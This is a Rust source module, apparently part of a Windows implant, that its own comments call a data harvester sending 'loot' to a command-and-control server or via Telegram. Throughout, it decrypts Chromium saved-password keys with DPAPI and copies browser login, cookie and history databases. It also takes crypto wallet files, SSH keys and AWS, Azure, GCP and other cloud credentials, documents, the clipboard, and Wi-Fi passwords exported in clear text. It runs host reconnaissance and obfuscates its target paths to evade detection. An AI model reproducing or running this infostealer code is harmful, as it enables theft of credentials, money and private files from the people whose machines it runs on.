//! Data harvester. Collects high-value artifacts from the host and streams
//! them to the C2 as loot files (binary 0x03 frames), preceded by a JSON
//! `loot_meta` and followed by `harvest_done`.
//!
//! Collectors: browser secrets (Chromium DPAPI + AES-256-GCM), wallets,
//! SSH/cloud keys, documents, saved Wi-Fi profiles, clipboard, and an
//! environment/process/AV report. All collectors are best-effort: a missing
//! path or a locked database never aborts the run.
#![cfg(windows)]

use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::Duration;

use base64::Engine;
use serde_json::json;
use sha2::{Digest, Sha256};
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::Message;

use windows::Win32::Foundation::{HGLOBAL, HLOCAL, HWND, LocalFree};
use windows::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
};
use windows::Win32::System::DataExchange::{
    CloseClipboard, GetClipboardData, IsClipboardFormatAvailable, OpenClipboard,
};
use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};

const MAX_FILE: usize = 8 * 1024 * 1024;
const MAX_TOTAL: usize = 40 * 1024 * 1024;
const CF_UNICODETEXT: u32 = 13;

struct Loot {
    name: String,
    kind: &'static str,
    data: Vec<u8>,
}

/// Entry point called from the C2 reader on a `{"t":"harvest"}` command.
pub async fn run(req: serde_json::Value, out_tx: mpsc::Sender<Message>) {
    let id = req
        .get("id")
        .and_then(|x| x.as_str())
        .unwrap_or("")
        .to_string();
    let collectors: Vec<String> = req
        .get("collectors")
        .and_then(|x| x.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();
    let extra: Vec<String> = req
        .get("paths")
        .and_then(|x| x.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();

    let _ = out_tx
        .send(Message::Text(
            json!({"t":"harvest_ack","id":id}).to_string(),
        ))
        .await;

    // Everything below is blocking file/registry/process work.
    let items = tokio::task::spawn_blocking(move || collect(&collectors, &extra))
        .await
        .unwrap_or_default();

    // Telegram mode: zip everything and upload it. The C2 gets only the
    // completion notice, never the loot itself.
    if crate::telegram::enabled() {
        let count = items.len();
        let bytes: usize = items.iter().map(|l| l.data.len()).sum();
        let pairs: Vec<(String, Vec<u8>)> =
            items.into_iter().map(|l| (l.name, l.data)).collect();
        let res = tokio::task::spawn_blocking(move || crate::telegram::exfil(&pairs)).await;
        let (ok, note) = match res {
            Ok(Ok(msg)) => (true, msg),
            Ok(Err(e)) => (false, e),
            Err(e) => (false, format!("join: {e}")),
        };
        let _ = out_tx
            .send(Message::Text(
                json!({
                    "t": "harvest_done",
                    "id": id,
                    "count": count,
                    "bytes": bytes,
                    "via": "telegram",
                    "ok": ok,
                    "note": note,
                })
                .to_string(),
            ))
            .await;
        return;
    }

    let mut count = 0usize;
    let mut bytes = 0usize;
    for loot in items {
        if bytes + loot.data.len() > MAX_TOTAL {
            break;
        }
        bytes += loot.data.len();
        let meta = json!({
            "t": "loot_meta",
            "id": id,
            "name": &loot.name,
            "kind": loot.kind,
            "size": loot.data.len(),
            "sha256": sha256_hex(&loot.data),
        });
        if out_tx
            .send(Message::Text(meta.to_string()))
            .await
            .is_err()
        {
            return;
        }
        if let Some(frame) = loot_frame(&loot.name, &loot.data) {
            if out_tx.send(Message::Binary(frame)).await.is_err() {
                return;
            }
        }
        count += 1;
    }

    let _ = out_tx
        .send(Message::Text(
            json!({"t":"harvest_done","id":id,"count":count,"bytes":bytes}).to_string(),
        ))
        .await;
}

fn loot_frame(name: &str, data: &[u8]) -> Option<Vec<u8>> {
    let nb = name.as_bytes();
    if nb.len() > u16::MAX as usize {
        return None;
    }
    let mut f = Vec::with_capacity(3 + nb.len() + data.len());
    f.push(0x03);
    f.extend_from_slice(&(nb.len() as u16).to_le_bytes());
    f.extend_from_slice(nb);
    f.extend_from_slice(data);
    Some(f)
}

fn sha256_hex(data: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(data);
    let d = h.finalize();
    let mut s = String::with_capacity(64);
    for b in d {
        s.push_str(&format!("{b:02x}"));
    }
    s
}

// ---------------------------------------------------------------------------
// collector dispatch
// ---------------------------------------------------------------------------

/// Collect every built-in artifact as `(relative_name, bytes)`. Used by the
/// Telegram auto-harvest path, which has no C2 socket to stream frames to.
pub fn collect_all() -> Vec<(String, Vec<u8>)> {
    collect(&[], &[])
        .into_iter()
        .map(|l| (l.name, l.data))
        .collect()
}

/// Collect only the named collectors (space-separated from a Telegram
/// command). Empty input means "all".
pub fn collect_selected(which: &str) -> Vec<(String, Vec<u8>)> {
    let names: Vec<String> = which
        .split_whitespace()
        .map(str::to_string)
        .collect();
    collect(&names, &[])
        .into_iter()
        .map(|l| (l.name, l.data))
        .collect()
}

/// Collect arbitrary operator-supplied files/dirs.
pub fn collect_paths(paths: &[String]) -> Vec<(String, Vec<u8>)> {
    let mut out = Vec::new();
    for p in paths {
        out.extend(collect_path(p));
    }
    out.into_iter().map(|l| (l.name, l.data)).collect()
}

/// Current clipboard text, if any.
pub fn clipboard_text() -> Option<String> {
    collect_clipboard()
        .into_iter()
        .next()
        .and_then(|l| String::from_utf8(l.data).ok())
}

fn collect(which: &[String], extra: &[String]) -> Vec<Loot> {
    let want = |n: &str| which.is_empty() || which.iter().any(|w| w == n);
    let mut out = Vec::new();

    if want("env") {
        out.extend(collect_env());
    }
    if want("browsers") {
        out.extend(collect_browsers());
    }
    if want("wallets") {
        out.extend(collect_wallets());
    }
    if want("keys") {
        out.extend(collect_keys());
    }
    if want("documents") {
        out.extend(collect_documents());
    }
    if want("wifi") {
        out.extend(collect_wifi());
    }
    if want("clipboard") {
        out.extend(collect_clipboard());
    }
    for p in extra {
        out.extend(collect_path(p));
    }
    out
}

// ---------------------------------------------------------------------------
// environment / host report
// ---------------------------------------------------------------------------

fn collect_env() -> Vec<Loot> {
    let mut report = String::new();
    report.push_str("== identity ==\n");
    for (k, v) in std::env::vars() {
        report.push_str(&format!("{k}={v}\n"));
    }
    report.push_str(&format!(
        "\n== cwd ==\n{}\n",
        std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_default()
    ));

    let probes: [(&str, &[&str]); 6] = [
        ("whoami /all", &["whoami", "/all"]),
        ("ipconfig /all", &["ipconfig", "/all"]),
        ("tasklist", &["tasklist", "/fo", "csv", "/nh"]),
        ("net user", &["net", "user"]),
        ("net localgroup administrators", &["net", "localgroup", "administrators"]),
        (
            "av",
            &[
                "powershell",
                "-NoProfile",
                "-Command",
                "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | ConvertTo-Json -Compress",
            ],
        ),
    ];
    for (label, argv) in probes {
        report.push_str(&format!("\n== {label} ==\n"));
        report.push_str(&run_capture(argv[0], &argv[1..]));
        report.push('\n');
    }

    let mut out = vec![Loot {
        name: "env/report.txt".into(),
        kind: "env",
        data: cap(report.into_bytes()),
    }];

    let installed = run_capture(
        "powershell",
        &[
            "-NoProfile",
            "-Command",
            "Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher | ConvertTo-Json -Compress",
        ],
    );
    if !installed.is_empty() {
        out.push(Loot {
            name: "env/installed_software.json".into(),
            kind: "env",
            data: cap(installed.into_bytes()),
        });
    }
    out
}

/// Run a program with a hard wall-clock cap. The helper thread is left to
/// finish on timeout; the harvest run never blocks on a hung child.
fn run_capture(program: &str, args: &[&str]) -> String {
    let (tx, rx) = std::sync::mpsc::channel();
    let program = program.to_string();
    let thread_program = program.clone();
    let args: Vec<String> = args.iter().map(|s| s.to_string()).collect();
    std::thread::spawn(move || {
        let r = std::process::Command::new(&thread_program)
            .args(&args)
            .output();
        let _ = tx.send(r);
    });
    match rx.recv_timeout(Duration::from_secs(20)) {
        Ok(Ok(o)) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() {
                s.push_str(&e);
            }
            if s.len() > MAX_FILE {
                s = s.chars().take(MAX_FILE).collect();
            }
            s
        }
        Ok(Err(e)) => format!("[spawn {program}: {e}]"),
        Err(_) => "[timeout]".into(),
    }
}

// ---------------------------------------------------------------------------
// browsers
// ---------------------------------------------------------------------------

fn collect_browsers() -> Vec<Loot> {
    let mut out = Vec::new();
    let local = env_path("LOCALAPPDATA");
    let roaming = env_path("APPDATA");

    let mut chromium: Vec<(&str, PathBuf)> = Vec::new();
    if let Some(b) = &local {
        chromium.push(("chrome", b.join(crate::obf::de(crate::obf::H_CHROME))));
        chromium.push(("edge", b.join(crate::obf::de(crate::obf::H_EDGE))));
        chromium.push(("brave", b.join(crate::obf::de(crate::obf::H_BRAVE))));
        chromium.push(("vivaldi", b.join(crate::obf::de(crate::obf::H_VIVALDI))));
        chromium.push(("yandex", b.join(crate::obf::de(crate::obf::H_YANDEX))));
        chromium.push(("opera_gx", b.join(crate::obf::de(crate::obf::H_OPERA_GX))));
    }
    if let Some(b) = &roaming {
        chromium.push(("opera", b.join(crate::obf::de(crate::obf::H_OPERA))));
    }

    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let stage = std::env::temp_dir().join(format!("c2raw_{}_{}", std::process::id(), stamp));

    let mut pairs: Vec<(PathBuf, String)> = Vec::new();
    for (name, dir) in &chromium {
        if !dir.is_dir() {
            continue;
        }
        pairs.push((
            dir.join(crate::obf::de(crate::obf::H_LOCAL_STATE)),
            format!("{name}__LocalState.json"),
        ));
        for profile in chromium_profiles(dir) {
            let pdir = dir.join(&profile);
            let slug = slug(&profile);
            let targets = [
                (crate::obf::de(crate::obf::H_LOGIN_DATA), crate::obf::de(crate::obf::H_L_LOGIN)),
                (crate::obf::de(crate::obf::H_COOKIES), crate::obf::de(crate::obf::H_L_COOKIES)),
                (crate::obf::de(crate::obf::H_WEB_DATA), crate::obf::de(crate::obf::H_L_WEB)),
                (crate::obf::de(crate::obf::H_HISTORY), crate::obf::de(crate::obf::H_L_HISTORY)),
            ];
            for (file, label) in &targets {
                let dst_name = format!("{name}__{slug}__{label}");
                pairs.push((pdir.join(file), dst_name.clone()));
                for ext in ["-wal", "-shm"] {
                    let side = pdir.join(format!("{file}{ext}"));
                    if side.is_file() {
                        pairs.push((side, format!("{dst_name}{ext}")));
                    }
                }
            }
        }
    }

    // Firefox: NSS decryption is done offline; ship the raw profile.
    if let Some(roaming) = &roaming {
        let profiles = roaming.join(crate::obf::de(crate::obf::H_FIREFOX_PROF));
        if let Ok(rd) = std::fs::read_dir(&profiles) {
            for ent in rd.flatten() {
                let p = ent.path();
                if !p.is_dir() {
                    continue;
                }
                let slug = slug(&ent.file_name().to_string_lossy());
                let ff_files = [
                    crate::obf::de(crate::obf::H_LOGINS_JSON),
                    crate::obf::de(crate::obf::H_KEY4_DB),
                    crate::obf::de(crate::obf::H_KEY3_DB),
                    crate::obf::de(crate::obf::H_COOKIES_DB),
                    crate::obf::de(crate::obf::H_PLACES_DB),
                    crate::obf::de(crate::obf::H_PREFS_JS),
                ];
                for f in &ff_files {
                    pairs.push((p.join(f), format!("firefox__{slug}__{f}")));
                }
            }
        }
    }

    let staged = copy_batch(&pairs, &stage);
    let _ = std::fs::remove_dir_all(&stage);

    for (label, data) in staged {
        if label.ends_with("__LocalState.json") {
            if let Some(key) = chromium_key_from_bytes(&data) {
                let browser = label.trim_end_matches("__LocalState.json");
                out.push(Loot {
                    name: format!("browsers/{browser}__key.txt"),
                    kind: "creds",
                    data: hex(&key).into_bytes(),
                });
            }
        }
        out.push(Loot {
            name: format!("browsers/{label}"),
            kind: "browser",
            data,
        });
    }
    out
}

/// Copy the staged browser files with `CopyFileExW` (Rust `fs::copy`): no
/// `cmd.exe`, no child process at all. The trade-off is that the copy is
/// attributed to the implant process instead of a signed shell.
fn copy_batch(pairs: &[(PathBuf, String)], stage: &Path) -> Vec<(String, Vec<u8>)> {
    let mut out = Vec::new();
    if pairs.is_empty() {
        return out;
    }
    if std::fs::create_dir_all(stage).is_err() {
        return out;
    }

    for (src, label) in pairs {
        if !src.is_file() {
            continue;
        }
        let dst = stage.join(label);
        if std::fs::copy(src, &dst).is_err() {
            // Same-process fallback: read + write, still no child process.
            let Ok(data) = std::fs::read(src) else { continue };
            if std::fs::write(&dst, &data).is_err() {
                continue;
            }
        }
        if let Ok(data) = std::fs::read(&dst) {
            out.push((label.clone(), data));
        }
        let _ = std::fs::remove_file(&dst);
    }
    out
}

fn chromium_profiles(dir: &Path) -> Vec<String> {
    let mut v = Vec::new();
    if dir.join("Default").is_dir() {
        v.push("Default".to_string());
    }
    if let Ok(rd) = std::fs::read_dir(dir) {
        for ent in rd.flatten() {
            let n = ent.file_name().to_string_lossy().into_owned();
            if n.starts_with("Profile ") && ent.path().is_dir() {
                v.push(n);
            }
        }
    }
    v.sort();
    v
}

fn chromium_key_from_bytes(ls: &[u8]) -> Option<[u8; 32]> {
    let v: serde_json::Value = serde_json::from_slice(ls).ok()?;
    let b64 = v.get("os_crypt")?.get("encrypted_key")?.as_str()?;
    let raw = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
    let blob = raw.strip_prefix(b"DPAPI")?;
    let key = dpapi_unprotect(blob)?;
    if key.len() != 32 {
        return None;
    }
    let mut k = [0u8; 32];
    k.copy_from_slice(&key);
    Some(k)
}

fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    if data.is_empty() {
        return None;
    }
    unsafe {
        let in_blob = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut out_blob = CRYPT_INTEGER_BLOB::default();
        CryptUnprotectData(
            &in_blob,
            None,
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut out_blob,
        )
        .ok()?;
        let out = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec();
        let _ = LocalFree(HLOCAL(out_blob.pbData as *mut core::ffi::c_void));
        Some(out)
    }
}

fn hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for x in b {
        s.push_str(&format!("{x:02x}"));
    }
    s
}

fn collect_wallets() -> Vec<Loot> {
    let mut out = Vec::new();
    let appdata = env_path("APPDATA");
    let local = env_path("LOCALAPPDATA");
    let mut files: Vec<PathBuf> = Vec::new();

    if let Some(a) = &appdata {
        files.extend(glob_files(&a.join(r"Electrum\wallets"), 2, 4 * 1024 * 1024));
        files.extend(glob_files(&a.join(r"Exodus\exodus.wallet"), 1, 4 * 1024 * 1024));
        files.extend(glob_files(&a.join(r"Ethereum\keystore"), 1, 2 * 1024 * 1024));
        files.extend(glob_files(&a.join(r"Monero\wallets"), 2, 4 * 1024 * 1024));
        for n in ["wallet.dat", "wallet.db"] {
            for coin in ["Bitcoin", "Litecoin", "Dogecoin", "DashCore", "BitcoinCash"] {
                let p = a.join(coin).join(n);
                if p.is_file() {
                    files.push(p);
                }
            }
        }
        files.extend(glob_files(&a.join(r"Atomic\Local Storage"), 3, 4 * 1024 * 1024));
        files.extend(glob_files(&a.join(r"Ledger Live"), 2, 2 * 1024 * 1024));
    }
    if let Some(l) = &local {
        let ext = |base: &Path, id: &str| {
            base.join(crate::obf::de(crate::obf::H_EXT_BASE)).join(id)
        };
        files.extend(glob_files(&ext(&l.join(crate::obf::de(crate::obf::H_CHROME)), "nkbihfbeogaeaoehlefnkodbefgpgknn"), 1, 4 * 1024 * 1024));
        files.extend(glob_files(&ext(&l.join(crate::obf::de(crate::obf::H_CHROME)), "bfnaelmomeimhlpmgjnjophhpkkoljpa"), 1, 4 * 1024 * 1024));
        files.extend(glob_files(&ext(&l.join(crate::obf::de(crate::obf::H_EDGE)), "nkbihfbeogaeaoehlefnkodbefgpgknn"), 1, 4 * 1024 * 1024));
        files.extend(glob_files(&ext(&l.join(crate::obf::de(crate::obf::H_BRAVE)), "nkbihfbeogaeaoehlefnkodbefgpgknn"), 1, 4 * 1024 * 1024));
    }

    for (i, f) in files.into_iter().enumerate() {
        if let Some(d) = read_capped(&f, 4 * 1024 * 1024) {
            let base = f
                .file_name()
                .map(|n| slug(&n.to_string_lossy()))
                .unwrap_or_else(|| "file".into());
            out.push(Loot {
                name: format!("wallets/{i:03}_{base}"),
                kind: "wallet",
                data: d,
            });
        }
    }
    out
}

// ---------------------------------------------------------------------------
// keys / cloud credentials
// ---------------------------------------------------------------------------

fn collect_keys() -> Vec<Loot> {
    let mut out = Vec::new();
    let home = env_path("USERPROFILE");
    let appdata = env_path("APPDATA");
    let local = env_path("LOCALAPPDATA");
    let mut files: Vec<PathBuf> = Vec::new();

    if let Some(h) = &home {
        files.extend(glob_files(&h.join(r".ssh"), 1, 512 * 1024));
        for f in [
            r".aws\credentials",
            r".aws\config",
            r".azure\azureProfile.json",
            r".docker\config.json",
            r".gitconfig",
            r".git-credentials",
            r".npmrc",
            r".pypirc",
            r".netrc",
            r".vault-token",
            r".config\gh\hosts.yml",
            r".config\gcloud\credentials.db",
            r".config\gcloud\application_default_credentials.json",
            r".kube\config",
        ] {
            let p = h.join(f);
            if p.is_file() {
                files.push(p);
            }
        }
    }
    if let Some(a) = &appdata {
        files.extend(glob_files(&a.join(r"FileZilla"), 1, 512 * 1024));
        files.extend(glob_files(&a.join(r"gcloud"), 1, 512 * 1024));
        files.extend(glob_files(&a.join(r"Microsoft\Credentials"), 1, 512 * 1024));
        files.extend(glob_files(&a.join(r"OpenVPN Connect\profiles"), 1, 512 * 1024));
    }
    if let Some(l) = &local {
        files.extend(glob_files(&l.join(r"Microsoft\Credentials"), 1, 512 * 1024));
    }
    // Loose key material on common user surfaces.
    let mut surfaces: Vec<&Path> = Vec::new();
    if let Some(h) = &home {
        surfaces.push(h.as_path());
    }
    if let Some(a) = &appdata {
        surfaces.push(a.as_path());
    }
    for base in surfaces {
        files.extend(glob_ext(
            &base.join("Desktop"),
            1,
            512 * 1024,
            &["pem", "key", "pfx", "p12", "kdbx", "ovpn", "rdp"],
        ));
    }

    for (i, f) in files.into_iter().enumerate() {
        if let Some(d) = read_capped(&f, 512 * 1024) {
            let base = f
                .file_name()
                .map(|n| slug(&n.to_string_lossy()))
                .unwrap_or_else(|| "file".into());
            out.push(Loot {
                name: format!("keys/{i:03}_{base}"),
                kind: "keys",
                data: d,
            });
        }
    }
    out
}

// ---------------------------------------------------------------------------
// documents
// ---------------------------------------------------------------------------

fn collect_documents() -> Vec<Loot> {
    let mut out = Vec::new();
    let Some(home) = env_path("USERPROFILE") else {
        return out;
    };
    let exts = [
        "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "csv", "rtf",
        "odt", "ods", "sql", "bak", "env", "conf", "ini", "ps1", "bat", "cmd",
        "vbs", "js", "json", "xml", "yml", "yaml", "log",
    ];
    let roots = [
        home.join("Desktop"),
        home.join("Documents"),
        home.join("Downloads"),
        home.join(r"OneDrive\Desktop"),
        home.join(r"OneDrive\Documents"),
    ];
    let mut n = 0usize;
    for root in roots {
        for f in glob_ext(&root, 2, 1024 * 1024, &exts) {
            if n >= 200 {
                break;
            }
            if let Some(d) = read_capped(&f, 1024 * 1024) {
                let base = f
                    .file_name()
                    .map(|x| slug(&x.to_string_lossy()))
                    .unwrap_or_else(|| "file".into());
                out.push(Loot {
                    name: format!("documents/{n:03}_{base}"),
                    kind: "document",
                    data: d,
                });
                n += 1;
            }
        }
    }
    out
}

// ---------------------------------------------------------------------------
// wifi
// ---------------------------------------------------------------------------

fn collect_wifi() -> Vec<Loot> {
    let mut out = Vec::new();
    let dir = std::env::temp_dir().join(format!("c2wifi_{}", std::process::id()));
    let _ = std::fs::create_dir_all(&dir);
    let dir_s = dir.to_string_lossy().into_owned();
    let folder_arg = format!("folder={dir_s}");
    let _ = run_capture(
        "netsh",
        &["wlan", "export", "profile", "key=clear", folder_arg.as_str()],
    );
    if let Ok(rd) = std::fs::read_dir(&dir) {
        for ent in rd.flatten() {
            let p = ent.path();
            if p
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("xml"))
                .unwrap_or(false)
            {
                if let Some(d) = read_capped(&p, 256 * 1024) {
                    let base = p
                        .file_name()
                        .map(|x| slug(&x.to_string_lossy()))
                        .unwrap_or_else(|| "profile.xml".into());
                    out.push(Loot {
                        name: format!("wifi/{base}"),
                        kind: "wifi",
                        data: d,
                    });
                }
            }
        }
    }
    let _ = std::fs::remove_dir_all(&dir);
    out
}

// ---------------------------------------------------------------------------
// clipboard
// ---------------------------------------------------------------------------

fn collect_clipboard() -> Vec<Loot> {
    let mut out = Vec::new();
    unsafe {
        if IsClipboardFormatAvailable(CF_UNICODETEXT).is_ok()
            && OpenClipboard(HWND::default()).is_ok()
        {
            if let Ok(h) = GetClipboardData(CF_UNICODETEXT) {
                let hg = HGLOBAL(h.0);
                let ptr = GlobalLock(hg) as *const u16;
                if !ptr.is_null() {
                    let mut len = 0usize;
                    while len < (1 << 20) && *ptr.add(len) != 0 {
                        len += 1;
                    }
                    let s = String::from_utf16_lossy(std::slice::from_raw_parts(ptr, len));
                    let _ = GlobalUnlock(hg);
                    if !s.is_empty() {
                        out.push(Loot {
                            name: "clipboard/current.txt".into(),
                            kind: "clipboard",
                            data: cap(s.into_bytes()),
                        });
                    }
                }
            }
            let _ = CloseClipboard();
        }
    }
    out
}

// ---------------------------------------------------------------------------
// extra operator paths
// ---------------------------------------------------------------------------

fn collect_path(p: &str) -> Vec<Loot> {
    let path = PathBuf::from(p);
    if path.is_file() {
        return read_capped(&path, MAX_FILE)
            .map(|d| {
                vec![Loot {
                    name: format!("custom/{}", slug(&path.to_string_lossy())),
                    kind: "custom",
                    data: d,
                }]
            })
            .unwrap_or_default();
    }
    if path.is_dir() {
        return glob_files(&path, 2, MAX_FILE as u64)
            .into_iter()
            .enumerate()
            .filter_map(|(i, f)| {
                read_capped(&f, MAX_FILE).map(|d| Loot {
                    name: format!(
                        "custom/{i:03}_{}",
                        slug(&f
                            .file_name()
                            .map(|n| n.to_string_lossy().into_owned())
                            .unwrap_or_default())
                    ),
                    kind: "custom",
                    data: d,
                })
            })
            .collect();
    }
    Vec::new()
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

fn env_path(k: &str) -> Option<PathBuf> {
    std::env::var_os(k).map(PathBuf::from)
}

fn slug(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' {
            out.push(c);
        } else {
            out.push('_');
        }
    }
    let out = out.trim_matches('_').to_string();
    if out.is_empty() {
        "file".into()
    } else {
        out.chars().take(120).collect()
    }
}

fn cap(mut v: Vec<u8>) -> Vec<u8> {
    if v.len() > MAX_FILE {
        v.truncate(MAX_FILE);
    }
    v
}

fn read_capped(p: &Path, max: usize) -> Option<Vec<u8>> {
    let meta = std::fs::metadata(p).ok()?;
    if !meta.is_file() || meta.len() == 0 {
        return None;
    }
    let mut f = std::fs::File::open(p).ok()?;
    let mut buf = Vec::with_capacity((meta.len() as usize).min(max));
    let mut take = f.by_ref().take(max as u64);
    take.read_to_end(&mut buf).ok()?;
    Some(buf)
}

/// Walk up to `depth` levels under `root`, returning files no larger than
/// `max`. Best-effort: unreadable entries are skipped.
fn glob_files(root: &Path, depth: usize, max: u64) -> Vec<PathBuf> {
    let mut out = Vec::new();
    walk(root, depth, max, &mut out);
    out
}

fn glob_ext(root: &Path, depth: usize, max: u64, exts: &[&str]) -> Vec<PathBuf> {
    let mut out = Vec::new();
    walk_ext(root, depth, max, exts, &mut out);
    out
}

fn walk(dir: &Path, depth: usize, max: u64, out: &mut Vec<PathBuf>) {
    if depth == 0 {
        return;
    }
    let Ok(rd) = std::fs::read_dir(dir) else { return };
    for ent in rd.flatten() {
        let p = ent.path();
        let Ok(meta) = ent.metadata() else { continue };
        if meta.is_dir() {
            walk(&p, depth - 1, max, out);
        } else if meta.is_file() && meta.len() <= max && meta.len() > 0 {
            out.push(p);
        }
        if out.len() >= 400 {
            return;
        }
    }
}

fn walk_ext(dir: &Path, depth: usize, max: u64, exts: &[&str], out: &mut Vec<PathBuf>) {
    if depth == 0 {
        return;
    }
    let Ok(rd) = std::fs::read_dir(dir) else { return };
    for ent in rd.flatten() {
        let p = ent.path();
        let Ok(meta) = ent.metadata() else { continue };
        if meta.is_dir() {
            walk_ext(&p, depth - 1, max, exts, out);
        } else if meta.is_file() && meta.len() <= max && meta.len() > 0 {
            let ext = p
                .extension()
                .map(|e| e.to_string_lossy().to_ascii_lowercase())
                .unwrap_or_default();
            if exts.iter().any(|x| *x == ext.as_str()) {
                out.push(p);
            }
        }
        if out.len() >= 400 {
            return;
        }
    }
}
